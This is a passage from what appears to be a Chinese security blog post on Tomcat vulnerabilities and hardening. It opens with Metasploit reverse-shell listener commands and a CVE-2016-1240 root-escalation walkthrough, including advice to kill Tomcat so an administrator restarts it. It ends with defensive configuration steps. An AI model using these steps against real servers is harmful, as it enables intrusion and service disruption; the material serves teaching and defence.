+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use exploit/multi/handler</span><br><span class="line">msf5 &gt; set payload java/meterpreter/reverse_https msf5 &gt; set lhost 192.168.3.7</span><br><span class="line">msf5 &gt; set lport 443</span><br><span class="line">msf5 &gt; set exitonsession false msf5 &gt; exploit -j</span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">meterpreter &gt; pwd</span><br></pre></td></tr></table></figure>
+<p>跟上 catalina.out 日志文件所在路径,开始执行 exp 脚本,此时只待目标重启 tomcat 服务,我们便可获取一个 root 权限的 shell,其实,是因为在 tmp 目录下下会生成一个带有 suid 权限的 tomcatrootsh 文件</p>
+<p>Ok,此处我们就自己用 root 到目标机器上重启下 tomcat 服务,看看实际提权效果,实战中,完全可以不用等,想办法直接把 tomcat 进程干掉,逼着管理员过来重启 tomcat 就行</p>
+<p>当目标管理员重启 tomcat 服务后,我们便立即有了一个 root 权限的 shell。</p>
+<h3 id="6-Tomcat安全绕过漏洞-CVE-2018-1305"><a href="#6-Tomcat安全绕过漏洞-CVE-2018-1305" class="headerlink" title="6.    Tomcat安全绕过漏洞[CVE-2018-1305]"></a>6.    Tomcat安全绕过漏洞[CVE-2018-1305]</h3><p>mark:    <a href="http://www.nsfocus.com.cn/content/details_141_2703.html" target="_blank" rel="noopener">http://www.nsfocus.com.cn/content/details_141_2703.html</a></p>
+<p><a href="https://xz.aliyun.com/t/2088" target="_blank" rel="noopener">https://xz.aliyun.com/t/2088</a></p>
+<p>受影响版本</p>
+<blockquote>
+<p>Apache Tomcat &lt; 9.0.5<br>Apache Tomcat &lt; 8.5.28<br>Apache Tomcat &lt; 8.0.50<br>Apache Tomcat &lt; 7.0.85</p>
+</blockquote>
+<blockquote>
+<p>条件：</p>
+<p>业务系统部署在低版本的Tomcat中。<br>业务系统通过注解的方式定义安全约束。</p>
+</blockquote>
+<p>漏洞危害较高，但是利用条件困难，因此影响范围并不大。</p>
+<h2 id="0x02-Tomcat服务安全加固"><a href="#0x02-Tomcat服务安全加固" class="headerlink" title="0x02 Tomcat服务安全加固"></a>0x02 Tomcat服务安全加固</h2><p>Tomcat服务默认启用了管理后台功能，使用该后台可直接上传 war 文件包对站点进行部署和管理。由于运维人员的疏忽，可能导致管理后台存在空口令或者弱口令的漏洞，使得黑客或者不法分子可以利用该漏洞直接上传 Webshell 脚本导致服务器沦陷。</p>
+<p>通常 Tomcat 后台管理的 URL 地址为 <a href="http://ip:8080/manager/html/" target="_blank" rel="noopener">http://iP:8080/manager/html/</a>,</p>
+<p>黑客通过猜解到的口令登录 Tomcat 管理后台后，可以上传 Webshell 脚本导致服务器被入侵。</p>
+<h3 id="安全加固方案"><a href="#安全加固方案" class="headerlink" title="安全加固方案"></a>安全加固方案</h3><p>由于此类型漏洞可能对业务系统造成比较严重的危害，建议针对 Tomcat 管理后台进行以下安全加固配置。</p>
+<h4 id="1-网络访问控制"><a href="#1-网络访问控制" class="headerlink" title="1. 网络访问控制"></a>1. 网络访问控制</h4><ul>
+<li>如果的业务不需要使用 Tomcat 管理后台管理业务代码，建议使用<a href="https://help.aliyun.com/document_detail/25475.html" target="_blank" rel="noopener">安全组防火墙</a>功能对管理后台 URL 地址进行拦截，或直接将 Tomcat 部署目录中 webapps 文件夹中的 manager、host-manager 文件夹全部删除，并注释 Tomcat 目录中 conf 文件夹中的 tomcat-users.xml 文件中的所有代码。</li>
+<li>如果的业务系统确实需要使用 Tomcat 管理后台进行业务代码的发布和管理，建议为 Tomcat 管理后台配置强口令，并修改默认 admin 用户，且密码长度不低于10位，必须包含大写字母、特殊符号、数字组合。</li>
+</ul>
+<h4 id="2-开启-Tomcat-的访问日志"><a href="#2-开启-Tomcat-的访问日志" class="headerlink" title="2. 开启 Tomcat 的访问日志"></a>2. 开启 Tomcat 的访问日志</h4><p>修改 conf/server.xml 文件，将下列代码取消注释：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Valve</span> <span class="attr">className</span>=<span class="string">"org.apache.catalina.valves.AccessLogValve"</span> <span class="attr">directory</span>=<span class="string">"logs"</span>   <span class="attr">prefix</span>=<span class="string">"localhost_access_log."</span> <span class="attr">suffix</span>=<span class="string">".txt"</span> <span class="attr">pattern</span>=<span class="string">"common"</span> <span class="attr">resolveHosts</span>=<span class="string">"false"</span>/&gt;</span></span><br></pre></td></tr></table></figure>
+<p>启用访问日志功能，重启 Tomcat 服务后，在 tomcat_home/logs 文件夹中就可以看到访问日志。</p>
+<h4 id="3-Tomcat-默认帐号安全"><a href="#3-Tomcat-默认帐号安全" class="headerlink" title="3.Tomcat 默认帐号安全"></a>3.Tomcat 默认帐号安全</h4><p>修改 Tomcat 安装目录 conf 下的 tomcat-user.xml 文件，重新设置复杂口令并保存文件。重启 Tomcat 服务后，新口令即生效。</p>
+<h4 id="4-修改默认访问端口"><a href="#4-修改默认访问端口" class="headerlink" title="4.修改默认访问端口"></a>4.修改默认访问端口</h4><p>修改 conf/server.xml 文件把默认的 8080 访问端口改成其它端口。</p>
+<h4 id="5-重定向错误页面"><a href="#5-重定向错误页面" class="headerlink" title="5. 重定向错误页面"></a>5. 重定向错误页面</h4><p>修改访问 Tomcat 错误页面的返回信息，在 webapps\manger 目录中创建相应的401.html、404.htm、500.htm 文件，然后在 conf/web.xml 文件的最后一行之前添加下列代码：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">error-page</span>&gt;</span>      </span><br><span class="line">                           <span class="tag">&lt;<span class="name">error-code</span>&gt;</span>401<span class="tag">&lt;/<span class="name">error-code</span>&gt;</span>              </span><br><span class="line">                           <span class="tag">&lt;<span class="name">location</span>&gt;</span>/401.htm<span class="tag">&lt;/<span class="name">location</span>&gt;</span>          </span><br><span class="line">                   <span class="tag">&lt;/<span class="name">error-page</span>&gt;</span>          </span><br><span class="line">                   <span class="tag">&lt;<span class="name">error-page</span>&gt;</span>    </span><br><span class="line">                           <span class="tag">&lt;<span class="name">error-code</span>&gt;</span>404<span class="tag">&lt;/<span class="name">error-code</span>&gt;</span>        </span><br><span class="line">                           <span class="tag">&lt;<span class="name">location</span>&gt;</span>/404.htm<span class="tag">&lt;/<span class="name">location</span>&gt;</span>          </span><br><span class="line">                   <span class="tag">&lt;/<span class="name">error-page</span>&gt;</span>  </span><br><span class="line">                   <span class="tag">&lt;<span class="name">error-page</span>&gt;</span>    </span><br><span class="line">                           <span class="tag">&lt;<span class="name">error-code</span>&gt;</span>500<span class="tag">&lt;/<span class="name">error-code</span>&gt;</span>  </span><br><span class="line">                           <span class="tag">&lt;<span class="name">location</span>&gt;</span>/500.htm<span class="tag">&lt;/<span class="name">location</span>&gt;</span>      </span><br><span class="line">                    <span class="tag">&lt;/<span class="name">error-page</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<h4 id="6-禁止列出目录"><a href="#6-禁止列出目录" class="headerlink" title="6. 禁止列出目录"></a>6. 禁止列出目录</h4><p>防止直接访问目录时由于找不到默认页面，而列出目录下的文件的情况。</p>
+<p>在 web.xml 文件中，将<code>&lt;param-name&gt;listings&lt;/param-name&gt;</code>改成<code>&lt;param-name&gt;false&lt;/param-name&gt;</code>。</p>
+<h4 id="7-删除文档和示例程序"><a href="#7-删除文档和示例程序" class="headerlink" title="7. 删除文档和示例程序"></a>7. 删除文档和示例程序</h4><p>删除 webapps 目录下的 docs、examples、manager、ROOT、host-manager 文件夹。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+      
+        
+	<div id="comment">
+		<!-- 来必力City版安装代码 -->
+		<div id="lv-container" data-id="city" data-uid="MTAyMC8zNTMwOS8xMTg0NQ">
+		<script type="text/javascript">
+		   (function(d, s) {
+		       var j, e = d.getElementsByTagName(s)[0];
+
+		       if (typeof LivereTower === 'function') { return; }
+
+		       j = d.createElement(s);
+		       j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+		       j.async = true;
+
+		       e.parentNode.insertBefore(j, e);
+		   })(document, 'script');
+		</script>
+		<noscript>为正常使用来必力评论功能请激活JavaScript</noscript>
+		</div>
+		<!-- City版安装代码已完成 -->
+	</div>
+
+
+
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web应用安全/">Web应用安全</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2018/02/16/口令暴破解实验/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">上一篇</strong>
+      <div class="article-nav-title">
+        
+          口令暴力破解实验
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2018/01/13/Web应用安全-Weblogic漏洞利用/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">下一篇</strong>
+      <div class="article-nav-title">Mimikatz</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+<!-- Table of Contents -->
+
+  <aside id="toc-sidebar">
+    <div id="toc" class="toc-article">
+    <strong class="toc-title">文章目录</strong>
+    
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Tomcat-系列漏洞利用与安全加固"><span class="nav-number">1.</span> <span class="nav-text">Tomcat 系列漏洞利用与安全加固</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x00-前言"><span class="nav-number">1.1.</span> <span class="nav-text">0x00 前言</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Tomcat-重要目录"><span class="nav-number">1.1.1.</span> <span class="nav-text">Tomcat 重要目录</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web-工程发布目录结构"><span class="nav-number">1.1.2.</span> <span class="nav-text">web 工程发布目录结构</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-漏洞利用"><span class="nav-number">1.2.</span> <span class="nav-text">0x01 漏洞利用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-发现目标的-tomcat-管理控制台入口"><span class="nav-number">1.2.1.</span> <span class="nav-text">1.    发现目标的 tomcat 管理控制台入口</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-低版本-tomcat-管理控制台的弱口令爆破"><span class="nav-number">1.2.2.</span> <span class="nav-text">2.    低版本 tomcat 管理控制台的弱口令爆破</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-war包部署webshell"><span class="nav-number">1.2.3.</span> <span class="nav-text">3.    war包部署webshell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-Tomacat-远程代码执行-CVE-2016-8735"><span class="nav-number">1.2.4.</span> <span class="nav-text">4.    Tomacat 远程代码执行[CVE-2016-8735 ]</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#前提是要启用JmxRemoteLifecycleListener包，默认情况下是不启用的"><span class="nav-number">1.2.4.1.</span> <span class="nav-text">前提是要启用JmxRemoteLifecycleListener包，默认情况下是不启用的</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#漏洞原理："><span class="nav-number">1.2.4.1.1.</span> <span class="nav-text">漏洞原理：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#影响范围"><span class="nav-number">1.2.4.1.2.</span> <span class="nav-text">影响范围</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#漏洞利用"><span class="nav-number">1.2.4.1.3.</span> <span class="nav-text">漏洞利用:</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-Tomcat-7-0-0-x-put-方法的利用-CVE-2017-12615"><span class="nav-number">1.2.5.</span> <span class="nav-text">5.    Tomcat 7.0.0.x put 方法的利用 [CVE-2017-12615]</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#前提是启动PUT方法、默认关闭。"><span class="nav-number">1.2.5.1.</span> <span class="nav-text">前提是启动PUT方法、默认关闭。</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#7-Tomcat-本地提权漏洞利用-CVE-2016-1240"><span class="nav-number">1.2.6.</span> <span class="nav-text">7.    Tomcat 本地提权漏洞利用[CVE-2016-1240]</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#前提：Debian-或者-Ubuntu-的特定-tomcat-deb-包-必须未升级"><span class="nav-number">1.2.6.1.</span> <span class="nav-text">前提：Debian 或者 Ubuntu 的特定 tomcat deb 包[必须未升级],</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#6-Tomcat安全绕过漏洞-CVE-2018-1305"><span class="nav-number">1.2.7.</span> <span class="nav-text">6.    Tomcat安全绕过漏洞[CVE-2018-1305]</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-Tomcat服务安全加固"><span class="nav-number">1.3.</span> <span class="nav-text">0x02 Tomcat服务安全加固</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#安全加固方案"><span class="nav-number">1.3.1.</span> <span class="nav-text">安全加固方案</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-网络访问控制"><span class="nav-number">1.3.1.1.</span> <span class="nav-text">1. 网络访问控制</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-开启-Tomcat-的访问日志"><span class="nav-number">1.3.1.2.</span> <span class="nav-text">2. 开启 Tomcat 的访问日志</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-Tomcat-默认帐号安全"><span class="nav-number">1.3.1.3.</span> <span class="nav-text">3.Tomcat 默认帐号安全</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4-修改默认访问端口"><span class="nav-number">1.3.1.4.</span> <span class="nav-text">4.修改默认访问端口</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#5-重定向错误页面"><span class="nav-number">1.3.1.5.</span> <span class="nav-text">5. 重定向错误页面</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#6-禁止列出目录"><span class="nav-number">1.3.1.6.</span> <span class="nav-text">6. 禁止列出目录</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#7-删除文档和示例程序"><span class="nav-number">1.3.1.7.</span> <span class="nav-text">7. 删除文档和示例程序</span></a></li></ol></li></ol></li></ol></li></ol>
+    
+    </div>
+  </aside>
+</section>
+        
+      </div>
+      
+      <footer id="footer">
+  
+
+  <div class="container">
+      	<div class="row">
+	      <p> Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/iTimeTraveler/hexo-theme-hiker" target="_blank">Hexo-theme-hiker</a> </p>
+	      <p id="copyRightEn">Copyright &copy; 2016 - 2018 shackle All Rights Reserved.</p>
+	      
+	      
+    		<p class="busuanzi_uv">
+				访客数 : <span id="busuanzi_value_site_uv"></span> |  
+				访问量 : <span id="busuanzi_value_site_pv"></span>
+		    </p>
+  		   
+		</div>
+
+		
+  </div>
+</footer>
+
+
+<!-- min height -->
+
+<script>
+    var wrapdiv = document.getElementById("wrap");
+    var contentdiv = document.getElementById("content");
+    var allheader = document.getElementById("allheader");
+
+    wrapdiv.style.minHeight = document.body.offsetHeight + "px";
+    if (allheader != null) {
+      contentdiv.style.minHeight = document.body.offsetHeight - allheader.offsetHeight - document.getElementById("footer").offsetHeight + "px";
+    } else {
+      contentdiv.style.minHeight = document.body.offsetHeight - document.getElementById("footer").offsetHeight + "px";
+    }
+</script>
+    </div>
+    <!-- <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+    <a href="/about" class="mobile-nav-link">About</a>
+  
+</nav> -->
+    
+
+<!-- mathjax config similar to math.stackexchange -->
+
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({
+    tex2jax: {
+      inlineMath: [ ['$','$'], ["\\(","\\)"] ],
+      processEscapes: true
+    }
+  });
+</script>
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+      tex2jax: {
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+      }
+    });
+</script>
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for(i=0; i < all.length; i += 1) {
+            all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+    });
+</script>
+
+<script type="text/javascript" src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+</script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<script src="/js/scripts.js"></script>
+
+
+
+
+  <script src="/js/dialog.js"></script>
+
+
+
+
+
+
+
+
+	<div style="display: none;">
+    <script src="https://s95.cnzz.com/z_stat.php?id=1261091520&web_id=1261091520" language="JavaScript"></script>
+  </div>
+
+
+
+	<script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+	</script>
+
+
+
+
+
+
+  </div>
+
+  <div class="modal fade" id="myModal" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true" style="display: none;">
+  <div class="modal-dialog">
+    <div class="modal-content">
+      <div class="modal-header">
+        <h2 class="modal-title" id="myModalLabel">设置</h2>
+      </div>
+      <hr style="margin-top:0px; margin-bottom:0px; width:80%; border-top: 3px solid #000;">
+      <hr style="margin-top:2px; margin-bottom:0px; width:80%; border-top: 1px solid #000;">
+
+
+      <div class="modal-body">
+          <div style="margin:6px;">
+            <a data-toggle="collapse" data-parent="#accordion" href="#collapseOne" onclick="javascript:setFontSize();" aria-expanded="true" aria-controls="collapseOne">
+              正文字号大小
+            </a>
+          </div>
+          <div id="collapseOne" class="panel-collapse collapse" role="tabpanel" aria-labelledby="headingOne">
+          <div class="panel-body">
+            您已调整页面字体大小
+          </div>
+        </div>
+      
+
+
+          <div style="margin:6px;">
+            <a data-toggle="collapse" data-parent="#accordion" href="#collapseTwo" onclick="javascript:setBackground();" aria-expanded="true" aria-controls="collapseTwo">
+              夜间护眼模式
+            </a>
+        </div>
+          <div id="collapseTwo" class="panel-collapse collapse" role="tabpanel" aria-labelledby="headingTwo">
+          <div class="panel-body">
+            夜间模式已经开启，再次单击按钮即可关闭 
+          </div>
+        </div>
+
+        <div>
+            <a data-toggle="collapse" data-parent="#accordion" href="#collapseThree" aria-expanded="true" aria-controls="collapseThree">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;关 于&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+        </div>
+         <div id="collapseThree" class="panel-collapse collapse" role="tabpanel" aria-labelledby="headingThree">
+          <div class="panel-body">
+            shackle
+          </div>
+          <div class="panel-body">
+            Copyright © 2018 shackle All Rights Reserved.
+          </div>
+        </div>
+      </div>
+
+
+      <hr style="margin-top:0px; margin-bottom:0px; width:80%; border-top: 1px solid #000;">
+      <hr style="margin-top:2px; margin-bottom:0px; width:80%; border-top: 3px solid #000;">
+      <div class="modal-footer">
+        <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
+      </div>
+    </div>
+  </div>
+</div>
+  
+  <a id="rocket" href="#top" class=""></a>
+  <script type="text/javascript" src="/js/totop.js?v=1.0.0" async=""></script>
+  
+    <a id="menu-switch"><i class="fa fa-bars fa-lg"></i></a>
+  
+</body>
+</html>
